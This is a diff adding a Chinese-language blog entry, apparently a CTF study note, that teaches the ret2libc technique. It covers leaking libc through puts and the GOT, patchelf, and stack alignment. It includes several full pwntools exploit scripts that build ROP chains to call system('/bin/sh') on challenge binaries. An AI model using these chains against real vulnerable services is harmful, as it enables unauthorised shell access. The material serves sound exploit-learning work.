@@ -25,4 +25,119 @@
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>ret2libc</title>
+    <url>/2025/04/24/ret2libc/</url>
+    <content><![CDATA[<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><ul>
+<li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，<strong>最低的 12 位</strong>并不会发生改变。</p>
+</li>
+<li><p>在<strong>libc库中函数之间的偏移量是固定的</strong>。</p>
+<p>可以利用以上特点来确定函数system和字符串&#x2F;bin&#x2F;sh的位置（或者是其他想利用函数的地址），从而获得shell（使用工具libcsearch工具确定使用的libc版本）</p>
+</li>
+</ul>
+<p><strong>由于Linux的延迟绑定机制，只有被调用过一次的函数才会将地址存储在.got表中，而__libc_start_main函数靠前（不一定是找这个函数，也可以在gdb中找其他已经被调用过的函数地址的低3位直接去对应网站找偏移量，从而确定libc基地址），由于函数已经被调用过一次，got表中已写入相应函数地址，可以直接用工具找到它的地址</strong></p>
+<h3 id="常规思路："><a href="#常规思路：" class="headerlink" title="常规思路："></a>常规思路：</h3><ol>
+<li>泄露__libc_start_main地址</li>
+<li>获取libc的版本</li>
+<li>获取system地址和&#x2F;bin&#x2F;sh的地址</li>
+<li>再次执行程序</li>
+<li>触发栈溢出执行system（‘&#x2F;bin&#x2F;sh’）</li>
+</ol>
+<p><strong>泄露地址处注意下接受数据的方式：</strong></p>
+<ul>
+<li>一般的puts函数或者是write函数类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))   <span class="comment">#64位</span></span><br><span class="line">u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#不建议第二种接受方式，因为如果地址中刚好有`7f`会导致接收出错</span></span><br><span class="line">u32(sh.recv(<span class="number">4</span>))                <span class="comment">#32位</span></span><br><span class="line">u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#同样不建议用第二种</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果是printf（<strong>不需要对数据进行小端序转换</strong>）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)   <span class="comment">#去掉输出数据最后的换行符，并将数据转换为16进制的形式。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="基本题型："><a href="#基本题型：" class="headerlink" title="基本题型："></a>基本题型：</h3><p>下面三种题型都摘自wiki，看不明白就去Wiki看看吧。</p>
+<ul>
+<li>retlibc1(可以用<code>ROPgadget</code>直接找到字符串&#x2F;bin&#x2F;sh的地址,在ida中可以找到函数system地址)</li>
+</ul>
+<p>利用简单栈溢出劫持控制流就好了。</p>
+<p>注意<strong>调用函数</strong>时要<strong>为函数带上一个返回地址</strong></p>
+<p>32位为例（32位是通过栈传参，64位是通过寄存器传参，所以构造payload时有些差别）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=flat([b&#x27;a&#x27;*112,system_plt,b&#x27;b&#x27;*4,binsh_addr])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>retlibc2（能找到system的地址，找不到‘&#x2F;bin&#x2F;sh’的地址）</li>
+</ul>
+<p>找不到字符串就利用输入函数自己输入个‘&#x2F;bin&#x2F;sh’</p>
+<p>函数地址的寻找（自己知道在ida中大概怎么找就好了，实际用一般不会再这里面找，直接用<code>pwntools</code>库中的<code>elf.sym</code>来找函数地址就好了）</p>
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250325225651374.png" alt="image-20250325225651374"></p>
+<p>.plt段在ida导航条的开头寻找，直接用pwntools库中的<code>elf.plt</code>也行。</p>
+<ul>
+<li><p>ret2libc3(程序中没有可利用的函数或者时字符串，利用glibc库中的)</p>
+<p>（下面的exp直接摘的wiki上面的，看看exp大致写法吧）</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get the related addr&quot;</span>)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>相差8字节原因去linux相关基础知识：<strong>栈对齐</strong>处。计算偏移量的方法最好是用gdb工具中的<code>cyclic</code>,直接找到覆盖<code>old ebp</code>所需要的字节数。exp出问题时最好是用<code>gdb.attach(sh)</code>动态调试下，看看构造的rop链是否正常传入，如果没有传入就要对应分析下问题在那里。（ps：一般还是不要脱离调试纯理论分析，一般不同的程序有很多地方是不同的，动调是最终的归宿，也是最快找到问题的方法&#x2F;(ㄒoㄒ)&#x2F;~~）</p>
+<h1 id="实战实例"><a href="#实战实例" class="headerlink" title="实战实例"></a>实战实例</h1><h3 id="retlibc-栈对齐"><a href="#retlibc-栈对齐" class="headerlink" title="retlibc+栈对齐"></a>retlibc+栈对齐</h3><p>题目：TGCTF 签到题</p>
+<p>这题没什么难度主要是有个栈对齐的问题要注意下</p>
+<hr>
+<p>看看<code>patchelf</code>工具的使用方法，后面会经常用到的（确保本地调试的动态链接库与远程题目中libc版本的一致，这样本地调试所找的到偏移之类的东西才能在远程时打通）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn   #修改libc</span><br><span class="line">patchelf --set-interpreter ./ld-2.31.so ./pwn  #修改ld</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>通常两个一起修改（都要有可执行权限），避免运行失败</p>
+</li>
+<li><p><strong>动态链接相关结构最好不要换libc</strong>(比如后面会学到的ret2dlresolve)</p>
+</li>
+</ul>
+<hr>
+<p>一般程序是默认使用当前系统自带的libc版本</p>
+<p>对这个题目进行修改libc库和动态链接器（ldd 查看）</p>
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424104922518.png" alt="image-20250424104922518"></p>
+<p>用patchelf修改</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn </span><br><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./pwn</span><br></pre></td></tr></table></figure>
+
+<p>修改完后可以用ldd再次查看</p>
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424105257246.png" alt="image-20250424105257246"></p>
+<p>修改成功，也可以在gdb中用vmmap查看下</p>
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424105352316.png" alt="image-20250424105352316"></p>
+<p>更为直观的看到是否修改为我们路径下的文件。</p>
+<p>先看看程序的保护机制</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424103552224.png" alt="image-20250424103552224"></p>
+<p>没开canary保护拖入ida中</p>
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424103650169.png" alt="image-20250424103650169"></p>
+<p>可以看到是个简单的栈溢出和ret2libc</p>
+<p>用gdb调试找下payload所需字节数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic 200 //不够再加点就是</span><br><span class="line">c        //直接让程序执行到ret处</span><br><span class="line">cyclic -l 0x*****（返回地址）</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424103454348.png" alt="image-20250424103454348"></p>
+<p>如图得到需要120个字节才能覆盖到返回地址</p>
+<p>接下来就是调用puts函数，泄露函数地址,找libc版本，确定libc基地址，然后利用偏移确定目标函数和参数的地址，最后写exp就好了。上面用的libcsearch这里就直接用网站找，（wiki里面那个exp好像有点点问题不能确定版本自己加点条件看看，也可以大概怎么写的就行）</p>
+<p>首先在gdb中下个断点断到想用来查询的函数已经被调用过一次（即已经实现函数got写入），用got指令查看一下</p>
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424111446277.png" alt="image-20250424111446277"></p>
+<p>可以看到红色部分就是函数的地址。</p>
+<p>在找libc的网站（<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc database search</a>）中输入函数名与低3位进行查询。</p>
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424111143079.png" alt="image-20250424111143079"></p>
+<p>到这里exp差不多就能写出来了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process([elf.path])</span><br><span class="line">libc=ELF(<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line"><span class="comment">#64位寄存器传参</span></span><br><span class="line">payload+=p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name.\n&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#断一下免得输入混乱，sleep也行</span></span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#接受输出的地址</span></span><br><span class="line">libc_address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x080e50</span></span><br><span class="line"><span class="comment">#打印下泄露的libc基地址</span></span><br><span class="line">log.info(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="comment">#确定目标地址</span></span><br><span class="line">system=libc_address+<span class="number">0x050d70</span></span><br><span class="line">str_bin_sh=libc_address+<span class="number">0x1d8678</span></span><br><span class="line"><span class="comment">#再次栈溢出，执行system函数</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">120</span></span><br><span class="line">payload+=p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload+=p64(str_bin_sh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line">payload+=p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name.\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>看一下第二次发送payload后的栈结构，貌似正确？</p>
+<p>![30c715d8df6d39ff85e055b03a99d101](C:\Users\hp\Documents\Tencent Files\3884945129\nt_qq\nt_data\Pic\2025-04\Ori\30c715d8df6d39ff85e055b03a99d101.png)</p>
+<p>用上面的exp跑的时候会出问题</p>
+<p><img src="C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250424115225562.png" alt="image-20250424115225562"></p>
+<p>提示栈没有对齐，在exp里面在调用system前将栈对齐（用一条<code>ret</code>指令）</p>
+<p>修改exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process([elf.path])</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,38259)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line"><span class="comment">#64位寄存器传参</span></span><br><span class="line">payload+=p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload+=p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name.\n&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#断一下免得输入混乱，sleep也行</span></span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#接受输出的地址</span></span><br><span class="line">libc_address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x080e50</span></span><br><span class="line"><span class="comment">#打印下泄露的libc基地址</span></span><br><span class="line">log.info(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc_address))</span><br><span class="line"><span class="comment">#确定目标地址</span></span><br><span class="line">system=libc_address+<span class="number">0x050d70</span></span><br><span class="line">str_bin_sh=libc_address+<span class="number">0x1d8678</span></span><br><span class="line"><span class="comment">#再次栈溢出，执行system函数</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">120</span></span><br><span class="line">payload+=p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload+=p64(str_bin_sh)</span><br><span class="line">payload+=p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload+=p64(system)</span><br><span class="line">payload+=p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name.\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>和下面脚本有一点区别，就是<code>libc_addr</code>和<code>libc.addr</code>.用后面那个吧，少几行代码。</p>
+<p>成功打通。</p>
+<p><strong>其实如果题目提供了libc的版本就不用去网站找偏移了，因为<code>libc.sym[&#39;puts&#39;]</code>本身表示的就是函数相对于libc基地址的偏移，<code>libc.search</code>找到的也是相对于libc基地址的偏移量</strong>，所以上面的exp可以改为</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process([elf.path])</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">120</span></span><br><span class="line">payload+=p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># puts@got</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># puts@plt</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name.\n&quot;</span>, payload)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">120</span></span><br><span class="line">payload+=p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)))</span><br><span class="line">payload+=p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;ret;&#x27;</span>),executable=<span class="literal">True</span>)))</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name.\n&quot;</span>, payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#p.sendline(b&#x27;cat flag&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+  </entry>
 </search>
